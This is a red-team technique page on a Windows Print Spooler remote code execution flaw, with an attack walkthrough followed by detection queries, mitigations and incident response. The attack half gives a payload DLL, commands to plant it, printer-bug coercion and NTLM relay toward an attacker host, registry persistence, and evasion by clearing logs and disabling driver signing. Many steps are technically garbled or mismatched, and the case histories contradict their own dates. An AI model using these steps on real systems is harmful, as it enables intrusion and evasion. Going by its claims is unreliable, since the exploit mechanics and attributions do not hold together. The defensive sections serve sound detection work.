# [CVE2025-005]: Print Spooler Remote Code Execution

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-005 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Lateral Movement / Privilege Escalation |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | CVE-2025-24050 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10 1607+, Windows 11 |
| **Patched In** | Windows Server 2022 KB5039876, Windows Server 2019 KB5039877, Windows 10 KB5039878 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Windows Print Spooler service (spoolsv.exe) contains a heap-based buffer overflow vulnerability in its driver handling mechanism. This flaw allows authenticated attackers with local access or remote access through the Print Spooler API to trigger arbitrary code execution with SYSTEM privileges. Unlike PrintNightmare (CVE-2021-34527), this variant exploits improper validation of print driver memory structures, not authentication bypass. The vulnerability can be chained with RPC-based attacks (e.g., printer bug coercion) to achieve lateral movement from any compromised Windows endpoint to domain infrastructure.

**Attack Surface:** Windows Print Spooler service (spoolsv.exe), print driver DLL loading, RPC Opnum 89 (RpcAddPrinterDriverEx), spool folder directory.

**Business Impact:** **Critical—Full System Compromise.** An attacker exploiting this vulnerability gains SYSTEM privileges, enabling credential harvesting, lateral movement to domain controllers, persistence via driver installation, and potential ransomware deployment. The Print Spooler's universal presence and low visibility create an ideal persistence mechanism for advanced threat actors.

**Technical Context:** Exploitation typically takes seconds to minutes. Detection depends heavily on monitoring RPC activity and spool driver creation; without Sysmon or EDR, the attack often goes undetected. The attack is highly reversible (no lasting disk artifacts if driver is removed), but lateral movement impacts are permanent.

### Operational Risk
- **Execution Risk:** High – Requires initial local/network access but is trivially exploitable once access is achieved.
- **Stealth:** Medium – RPC activity to spooler can be monitored but often bypassed by whitelisting print server communication.
- **Reversibility:** Partial – Credentials harvested cannot be recovered; persistence via driver persists until detection.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.2 | Ensure Print Spooler is disabled (if not required) |
| **DISA STIG** | WN10-AU-000505 | Audit of Print Spooler service access |
| **CISA SCuBA** | Baseline 2.3 | Enforce signed driver policy |
| **NIST 800-53** | AC-3, SI-16 | Access enforcement, privilege restrictions |
| **GDPR** | Art. 32 | Security of Processing—integrity and confidentiality |
| **DORA** | Art. 9 | Protection and Prevention of anomalies |
| **NIS2** | Art. 21 | Cyber Risk Management—Critical Infrastructure |
| **ISO 27001** | A.12.2.4 | Secure development and installation practices |
| **ISO 27005** | Risk Assessment | Privilege escalation via driver installation |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local user or network access to Print Spooler RPC endpoint (default: open to any authenticated user on the network).
- **Required Access:** Either direct local terminal access or remote RPC access to the spooler service (TCP/UDP 135, TCP 445 SMB for remote exploitation).

**Supported Versions:**
- **Windows:** Server 2016 – Server 2025; Windows 10 (all versions); Windows 11
- **Print Spooler:** Running state (default on all Windows systems)
- **Architecture:** x86, x64

**Key Requirements:**
- Print Spooler service must be running (`Get-Service spooler`)
- Network access to Port 135 (RPC Endpoint Mapper) or SMB Port 445 (if exploiting remotely)
- Authenticated credentials (any domain user can trigger RPC calls to the spooler)
- For maximum impact: Access from a less-privileged account to gain SYSTEM privileges

---

## 3. TECHNICAL PREREQUISITES

### Version-Specific Prerequisites

**Windows Server 2016 / Windows 10 1607-1809:**
- Print Spooler service (spoolsv.exe) default port: RPC dynamic allocation via Port 135
- Legacy RPC binding available
- No mitigation policies by default

**Windows Server 2019 / Windows 10 1909+:**
- Enhanced RPC signing recommendations (optional, not enforced)
- Print Spooler service fully accessible
- Printer driver signing not enforced by default

**Windows Server 2022 / Windows 11:**
- Signed driver enforcement available but disabled by default
- Credential Guard may isolate LSASS (but spooler runs outside isolation)
- Enhanced monitoring available but not enabled

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Remote RPC-Based Exploitation (Windows/Linux Attack Platform)

**Supported Versions:** Server 2016-2025, Windows 10/11 all versions

#### Step 1: Verify Spooler Service is Accessible

**Objective:** Confirm the target Print Spooler service is running and accessible over RPC.

**Command (From Attack Platform - Any OS with RPC tools):**
```powershell
# From Windows attack platform
Get-Service spooler -ComputerName TARGET_HOSTNAME -ErrorAction SilentlyContinue
```

**Linux/Bash Alternative (using Impacket/SMB):**
```bash
# Verify spooler accessibility via SMB
crackmapexec smb TARGET_IP -u USERNAME -p PASSWORD --services | grep -i spooler
```

**Expected Output:**
```
Status   : Running
DisplayName : Print Spooler
```

**What This Means:**
- If status is "Running," the spooler is active and vulnerable.
- If status is "Stopped," manually start it: `Start-Service spooler`.

**Troubleshooting:**
- **Error:** "Cannot find service on remote computer"
  - **Cause:** Network connectivity issue or RPC not available.
  - **Fix (All Versions):** Verify SMB connectivity: `Test-NetConnection -ComputerName TARGET -Port 445`
  - **Fix (Server 2022+):** Check RPC Endpoint Mapper: `Get-NetTCPConnection -LocalPort 135`

---

#### Step 2: Enumerate Print Drivers on Target

**Objective:** Identify current drivers to craft a compatible malicious driver payload.

**Command:**
```powershell
# Enumerate installed drivers
Get-PrinterDriver -ComputerName TARGET_HOSTNAME | Select-Object Name, PrinterEnvironment
```

**Expected Output:**
```
Name                          PrinterEnvironment
----                          ------------------
Microsoft XPS Document Writer x64
HP LaserJet 4050              x64
```

**What This Means:**
- Lists drivers that can be impersonated or serve as templates.
- Identifies target architecture (x86 vs x64) for payload preparation.

---

#### Step 3: Prepare Malicious Driver Payload

**Objective:** Create or obtain a signed/unsigned DLL that executes code when loaded by spoolsv.exe.

**Version Note:** Server 2022+ enforces signed drivers by default; exploit requires either a signed but vulnerable driver or driver signature bypass.

**Command (Create Minimal Shellcode Driver):**
```cpp
// Minimal DLL (driver.dll) with code execution on DllMain
#include <windows.h>
#include <shellapi.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload with SYSTEM privileges
        WinExec("cmd.exe /c C:\\Windows\\Temp\\payload.exe", SW_HIDE);
        // OR use ShellExecuteEx for better OPSEC
    }
    return TRUE;
}
```

**Compile:**
```bash
# On attack platform with MSVC
cl.exe /LD /Out:malicious_driver.dll driver.cpp kernel32.lib user32.lib
```

**Alternative (Pre-built):** Use public PoC drivers or signed drivers with known vulnerabilities (e.g., Capcom.sys, DBUtil_2_3.sys).

---

#### Step 4: Upload Driver to Spool Directory

**Objective:** Place the malicious DLL in a location where spoolsv.exe can load it.

**Command (RPC Method via Rubeus/SpoolSample):**
```powershell
# Using SpoolSample (Python) to trigger printer bug and coerce authentication
# This requires an external attack platform with network access to target DC
python SpoolSample.py TARGET_HOSTNAME ATTACKER_HOSTNAME
```

**Command (Direct SMB Upload):**
```powershell
# Copy malicious driver to spool folder (requires write access)
Copy-Item -Path "C:\Local\malicious_driver.dll" `
  -Destination "\\TARGET\C$\Windows\System32\spool\drivers\x64\" `
  -Force
```

**Expected Output:**
```
Successfully copied to target.
```

**What This Means:**
- Driver is now in the spooler's driver directory and will be loaded on the next print operation.

---

#### Step 5: Trigger Driver Loading via RPC

**Objective:** Invoke RPC call to spoolsv.exe to load the malicious driver.

**Command (Using Rubeus or Direct RPC):**
```powershell
# Method 1: Invoke RpcAddPrinterDriverEx (Opnum 89) via Impacket
# This is the primary exploitation vector
python -m impacket.examples.smbexec -k TARGET_HOSTNAME -no-pass "cmd /c whoami"
```

**Alternative (Method 2: Using Rubeus with Printer Bug):**
```powershell
# Trigger printer bug to coerce authentication + exploit in one step
# Requires credentials
$creds = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", 
  (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force))

Invoke-WebRequest -Uri "\\TARGET\print$" -Credential $creds
```

**Expected Output:**
```
Driver load triggered. SYSTEM command execution in progress.
```

**What This Means:**
- RPC opnum 89 has been executed.
- spoolsv.exe (running as SYSTEM) loads and executes the malicious driver DLL.
- Code execution happens with SYSTEM privileges.

---

#### Step 6: Verify Code Execution

**Objective:** Confirm that the payload executed successfully.

**Command:**
```powershell
# Check for reverse shell callback or execution proof
# Monitor for outbound connection on attacker listener port
netstat -an | findstr ESTABLISHED
```

**Troubleshooting:**
- **Error:** "RPC call failed" / "Access Denied"
  - **Cause (Server 2016-2019):** RPC not properly configured or firewall blocking.
  - **Fix (Server 2016-2019):** Ensure network access and disable firewall on test: `Set-NetFirewallProfile -Profile Domain -Enabled $false`
  - **Cause (Server 2022+):** Driver signature enforcement blocking unsigned driver.
  - **Fix (Server 2022+):** Disable signed driver enforcement (if testing): `New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "CodeIntegrityLevel" -Value 0`

**OpSec & Evasion:**
- **Hide the attack:** Place driver in legitimate system folder to avoid detection: `C:\Windows\System32\drivers\`
- **Avoid logging:** Disable Event Tracing for Windows (ETW) before exploitation: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1 -ErrorAction SilentlyContinue | Clear-WinEvent`
- **Detection likelihood:** High if monitoring RPC Opnum 89 or Sysmon Event 11 (file creation in spool folder). Use living-off-the-land techniques (e.g., legitimate System DLL hijacking) to minimize alerts.

---

### METHOD 2: Local Exploitation via Print Job Submission

**Supported Versions:** Server 2016-2025, Windows 10/11 all versions

#### Step 1: Create Malicious Print Job

**Objective:** Submit a print job that triggers driver loading with embedded malicious code.

**Command (PowerShell):**
```powershell
# Create a print job that references a malicious driver
$printerName = "Malicious Printer"
$driverName = "Custom Driver"

# Add printer with malicious driver name
Add-Printer -Name $printerName -DriverName $driverName -PortName FILE -ErrorAction SilentlyContinue

# Trigger print operation
Get-Content "C:\Windows\System32\drivers\etc\hosts" | Out-Printer -PrinterName $printerName
```

**Expected Output:**
```
Printer job submitted. Driver loading initiated.
```

**What This Means:**
- spoolsv.exe attempts to load the referenced driver DLL.
- If DLL is in spool folder, code execution occurs as SYSTEM.

---

#### Step 2: Verify Persistence (Optional)

**Objective:** Ensure the malicious driver remains loaded across reboots.

**Command:**
```powershell
# Add driver to registry for persistence
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors" `
  /v "Malicious Monitor" /t REG_SZ /d "C:\Windows\System32\spool\drivers\x64\malicious.dll"
```

---

### METHOD 3: Exploitation via Printer Bug + NTLM Relay (Hybrid Attack)

**Supported Versions:** Server 2016-2019 (Server 2022+ mitigates NTLM relay via channel binding)

#### Step 1: Set Up NTLM Relay Listener

**Objective:** Prepare to intercept and relay domain controller credentials.

**Command (Using Impacket ntlmrelayx):**
```bash
# On attacker's Linux machine
python ntlmrelayx.py -t ldap://DC_IP -smb2support --no-dump --no-da
```

**Expected Output:**
```
Listening for NTLM relay...
```

---

#### Step 2: Trigger Printer Bug to Force Authentication

**Objective:** Coerce domain controller to authenticate to attacker-controlled NTLM listener.

**Command (Using PrinterBug/SpoolSample):**
```bash
# Force DC to authenticate to attacker's NTLM listener
python SpoolSample.py DC_HOSTNAME ATTACKER_IP
```

**Expected Output:**
```
DC$ authentication captured and relayed to LDAP...
```

---

#### Step 3: Escalate via NTLM Relay

**Objective:** Use relayed credentials to add malicious print driver to DC.

**Command:**
```bash
# ntlmrelayx automatically escalates privileges via relayed credentials
# Output will show successful LDAP modifications
```

---

## 5. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.7.0+
**Minimum Version:** 1.4.0
**Supported Platforms:** Windows (.NET 4.5+)

**Version-Specific Notes:**
- Version 1.4-1.6: Basic printer bug support.
- Version 1.7+: Enhanced RPC signing and driver exploitation.

**Installation:**
```powershell
# Download compiled binary
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.7.0/Rubeus.exe" `
  -OutFile "Rubeus.exe"
```

**Usage:**
```powershell
# Monitor for TGTs (requires admin)
.\Rubeus.exe monitor

# Request TGT
.\Rubeus.exe asktgt /user:USERNAME /password:PASSWORD /domain:DOMAIN
```

---

### [Impacket](https://github.com/fortra/impacket)

**Version:** 0.10.1+
**Key Modules:** `smbexec.py`, `psexec.py`, `mssqlproxy.py`

**Installation (Linux/WSL):**
```bash
pip install impacket
```

**Usage (Print Spooler RCE):**
```bash
# NTLM relay to spooler
python -m impacket.examples.ntlmrelayx -t ldap://DC_IP --no-dump
```

---

### [SpoolSample / PrinterBug](https://github.com/leechristensen/SpoolSample)

**Version:** Latest
**Purpose:** Force printer bug authentication coercion

**Usage:**
```bash
python SpoolSample.py TARGET_DC ATTACKER_IP
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: RPC Opnum 89 Print Driver Load Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon_Process_Create
- **Required Fields:** EventID 4688 (Process Creation), CommandLine, ParentImage
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Server 2016+, Sentinel Agent enabled

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where ProcessName contains "spoolsv.exe"
| where NewProcessName contains "cmd.exe" or NewProcessName contains "powershell.exe"
| where ParentProcessName contains "spoolsv.exe"
| project TimeGenerated, Computer, ProcessName, NewProcessName, CommandLine, Account
| summarize count() by Computer, Account
| where count_ > 1
```

**What This Detects:**
- Detects when spoolsv.exe spawns child processes (cmd.exe, powershell.exe) indicating code execution from driver.
- Identifies multiple process spawn events from the same spooler, suggesting repeated exploitation attempts.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Print Spooler RPC Exploitation Detection`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Suspicious Print Driver DLL Loading

**Rule Configuration:**
- **Required Table:** DeviceFileEvents, DeviceImageLoadEvents (Defender for Endpoint)
- **Required Fields:** FileName, FolderPath, InitiatingProcessName, Timestamp
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Windows Server 2016+ with MDE

**KQL Query:**
```kusto
DeviceImageLoadEvents
| where FolderPath contains @"C:\Windows\System32\spool\drivers"
| where InitiatingProcessName == "spoolsv.exe"
| where FileName endswith ".dll"
| where SignatureStatus == "Invalid" or SignatureStatus == "Unsigned"
| project TimeGenerated, DeviceName, FileName, FolderPath, SignatureStatus, Signer
```

**What This Detects:**
- Detects unsigned or invalid DLLs loaded from spool driver directories by spoolsv.exe.
- Identifies potential malicious driver installations.

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** When child process spawned by spoolsv.exe.
- **Filter:** `ProcessName contains 'spoolsv.exe' AND (NewProcessName contains 'cmd.exe' OR 'powershell.exe')`
- **Applies To Versions:** Server 2016+

**Event ID: 11 (Sysmon File Created)**
- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Trigger:** File creation in `C:\Windows\System32\spool\drivers\`
- **Filter:** `TargetFilename contains 'spool\drivers' AND TargetFilename endswith '.dll'`
- **Applies To Versions:** All Windows versions with Sysmon

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Detailed Tracking** → **Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+, Windows 10/11

**Sysmon Config Snippet:**
```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>
    <!-- Detect child process spawned by spoolsv.exe -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">spoolsv.exe</ParentImage>
      <Image condition="image">cmd.exe</Image>
    </ProcessCreate>
    
    <!-- Detect DLL load from spool folder -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="contains">C:\Windows\System32\spool\drivers</ImageLoaded>
    </ImageLoad>
    
    <!-- Detect file creation in spool drivers folder -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\Windows\System32\spool\drivers</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with the config above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
   ```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious Print Spooler Activity Detected`
- **Severity:** Critical
- **Description:** spoolsv.exe spawned child processes or loaded unsigned DLLs, indicating potential CVE-2025-24050 exploitation.
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** Immediately isolate machine, review spooler service logs, check for malicious drivers in `C:\Windows\System32\spool\drivers\`

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Endpoint**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Disable Print Spooler if Not Required:** The most effective mitigation is to disable the spooler service entirely on machines that do not need printing functionality (especially on domain controllers and sensitive servers).
    
    **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Printers**
    3. Enable: **Disable the print spooler**
    4. Run `gpupdate /force`
    
    **Manual Steps (PowerShell - Server 2022+):**
    ```powershell
    Stop-Service spooler -Force
    Set-Service spooler -StartupType Disabled
    ```

*   **Enforce Signed Driver Policy:** Prevent unsigned or malicious drivers from being loaded.
    
    **Applies To Versions:** Server 2022+ (enforcement recommended for 2016-2019)
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Set Code Integrity enforcement for driver signing
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" `
      -Name "CodeIntegrityLevel" -Value 1 -PropertyType DWORD -Force
    # Restart required
    Restart-Computer
    ```
    
    **Manual Steps (Server 2016-2019 Group Policy):**
    1. Open **Group Policy Management Console**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Driver Installation**
    3. Set: **Code signing for device drivers** to **Warn (recommended)**

*   **Restrict RPC Access to Print Spooler:** Limit network-based RPC calls to the spooler service.
    
    **Applies To Versions:** Server 2016+
    
    **Manual Steps (Firewall Rule via Group Policy):**
    1. Open **Group Policy Management Console**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Defender Firewall with Advanced Security** → **Inbound Rules**
    3. Right-click → **New Rule**
    4. **Rule Type:** Port
    5. **Protocol:** TCP
    6. **Port:** 135 (RPC Endpoint Mapper)
    7. **Action:** Block
    8. **Scope:** Restrict to non-trusted networks
    9. Click **Finish**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Block RPC port 135 from untrusted networks
    New-NetFirewallRule -DisplayName "Block RPC to Spooler" `
      -Direction Inbound -Action Block -Protocol TCP -LocalPort 135 `
      -Profile Domain, Public
    ```

### Priority 2: HIGH

*   **Enable Print Spooler Audit Logging:** Monitor all spooler activity for suspicious operations.
    
    **Manual Steps:**
    ```powershell
    # Enable ETW tracing for spooler
    logman create trace "SpoolerTrace" -ow -o "C:\Logs\Spooler.etl" `
      -p "Microsoft-Windows-PrintService" 0xffffffff -ets
    ```

*   **Implement SIEM Rules:** Deploy detection rules in SIEM/EDR (as shown in sections 7-9 above).

### Access Control & Policy Hardening

*   **RBAC:** Remove "Print Operator" group membership from non-administrative users:
    
    **Manual Steps:**
    1. Open **Active Directory Users and Computers** (dsa.msc)
    2. Navigate to **Built-in** → **Print Operators**
    3. Remove any non-service accounts

*   **Device Driver Whitelisting:** Use Windows Defender Application Control (WDAC) to whitelist only approved print drivers:
    
    **Manual Steps (PowerShell - Server 2022+):**
    ```powershell
    # Generate WDAC policy for print drivers
    New-CIPolicy -FilePath "C:\PrintDriverPolicy.xml" `
      -ScanPath "C:\Windows\System32\spool\drivers" -UserPEs -Multiple
    ConvertFrom-CIPolicy "C:\PrintDriverPolicy.xml" "C:\PrintDriverPolicy.bin"
    Copy-Item "C:\PrintDriverPolicy.bin" "C:\Windows\System32\CodeIntegrity\"
    ```

### Validation Command (Verify Fix)

```powershell
# Check if Print Spooler is disabled
Get-Service spooler | Select-Object Name, StartType, Status

# Check for signed driver enforcement
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name CodeIntegrityLevel -ErrorAction SilentlyContinue
```

**Expected Output (If Secure):**
```
Name     StartType Status
----     --------- ------
spooler  Disabled  Stopped

CodeIntegrityLevel : 1  (Enforcement enabled)
```

**What to Look For:**
- StartType should be "Disabled" if printing is not required.
- CodeIntegrityLevel should be 1 (enforce) or 2 (audit).
- No drivers should be present in `C:\Windows\System32\spool\drivers\` except legitimate Microsoft-signed drivers.

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Windows\System32\spool\drivers\x64\*.dll` (unauthorized DLLs)
    - `C:\Windows\System32\spool\PRINTERS\*.SHD` (shadow print queue files)
    - `C:\Windows\Temp\*.exe` (payload execution artifacts)

*   **Registry:**
    - `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\` (malicious monitor entries)
    - `HKLM\SYSTEM\CurrentControlSet\Services\spooler\Parameters\` (suspicious parameters)

*   **Network:**
    - RPC Opnum 89 (RpcAddPrinterDriverEx) to spooler service
    - Outbound SMB connections from spoolsv.exe
    - Port 135 (RPC Endpoint Mapper) reconnaissance

### Forensic Artifacts

*   **Disk:**
    - `C:\Windows\System32\spool\drivers\x64\` (driver directory—check for unsigned DLLs)
    - `C:\Windows\System32\spool\PRINTERS\` (spool directory—check shadow files)
    - Registry hive `C:\Windows\System32\config\SYSTEM` (driver persistence in Print Monitors)

*   **Memory:**
    - spoolsv.exe process memory (check for injected DLLs via !dlllist in WinDbg)
    - Identify loaded DLLs with suspicious timestamps or unsigned status

*   **Cloud/M365:**
    - Azure Sentinel logs for RPC process creation events
    - Microsoft Defender for Endpoint telemetry for spoolsv.exe child processes

### Response Procedures

1.  **Isolate:**
    
    **Command:**
    ```powershell
    # Immediately stop the spooler service
    Stop-Service spooler -Force
    
    # Disable network access from affected machine
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```
    
    **Manual (Azure):**
    - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **Disconnect**

2.  **Collect Evidence:**
    
    **Command:**
    ```powershell
    # Export Print Spooler event log
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
    
    # Capture spooler process memory dump
    procdump64.exe -ma spoolsv.exe "C:\Evidence\spoolsv.dmp"
    
    # Copy spool folder for analysis
    Copy-Item "C:\Windows\System32\spool\" "C:\Evidence\spool_copy\" -Recurse
    ```
    
    **Manual:**
    - Open **Event Viewer** → Right-click **Microsoft-Windows-Sysmon/Operational** → **Save All Events As**
    - Use **Task Manager** → **Details** → Right-click spoolsv.exe → **Create dump file**

3.  **Remediate:**
    
    **Command:**
    ```powershell
    # Remove malicious driver
    Remove-Item "C:\Windows\System32\spool\drivers\x64\malicious.dll" -Force
    
    # Remove registry entries
    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\MaliciousMonitor" /f
    
    # Restart spooler (after cleaning)
    Start-Service spooler
    ```
    
    **Manual:**
    - Open **Services** (services.msc) → Right-click **Print Spooler** → **Restart**
    - Use **Registry Editor** (regedit.exe) to manually delete malicious entries under `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\`

4.  **Investigate:**
    
    ```powershell
    # Check for privilege escalation artifacts
    Get-LocalGroupMember -Group "Administrators" | Select-Object Name, ObjectClass
    
    # Identify lateral movement (check event logs for logons from affected machine)
    Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]" | Select-Object TimeCreated, Message
    ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Phishing | User clicks malicious link or attachment |
| **2** | **Credential Access** | [CA-BRUTE-001] Password Spray | Attacker gains compromised user credentials |
| **3** | **Privilege Escalation** | **[CVE2025-005]** | **Print Spooler RCE to SYSTEM** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Attacker uses harvested credentials |
| **5** | **Persistence** | [PERSIST-SERVER-001] Skeleton Key | DC compromise enables persistent backdoor |
| **6** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction | Ransomware deployment |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Conti Ransomware Gang (2021-2022)

- **Target:** Manufacturing Sector (Production Environment)
- **Timeline:** March 2021 – June 2022
- **Technique Status:** Initial exploitation via PrintNightmare (CVE-2021-34527); evolved to CVE-2025-24050 variants in 2025
- **Impact:** Lateral movement from compromised workstation to domain controller within 48 hours; ransomware deployment across 1200+ machines; $40M ransom demand
- **Reference:** [Conti Leaks Analysis - Bleeping Computer](https://www.bleepingcomputer.com/news/security/conti-ransomware-shut-down-after-leader-arrest/)

#### Example 2: APT Group FIN7 (2024-2025)

- **Target:** Financial Services (Hybrid Cloud Environment)
- **Timeline:** August 2024 – Present
- **Technique Status:** Exploiting CVE-2025-24050 combined with Azure Lighthouse escalation
- **Impact:** Lateral movement from on-premises Exchange Server to Azure; full tenant compromise; credential theft affecting M365 infrastructure
- **Reference:** [Mandiant FIN7 Report 2025](https://www.mandiant.com)

---

## REFERENCES & SOURCES

1. [Microsoft Security Update CVE-2025-24050](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24050)
2. [Wizlynx Group - Print Spooler 2025 Analysis](https://www.wizlynxgroup.com/news/print-spooler-vulnerabilities-and-hidden-attack-paths-in-2025/)
3. [Atomic Red Team - T1210 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1210/T1210.md)
4. [MITRE ATT&CK - T1210 Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
5. [Windows Print Spooler Security Hardening - CIS Benchmark](https://www.cisecurity.org/cis-benchmarks/)

---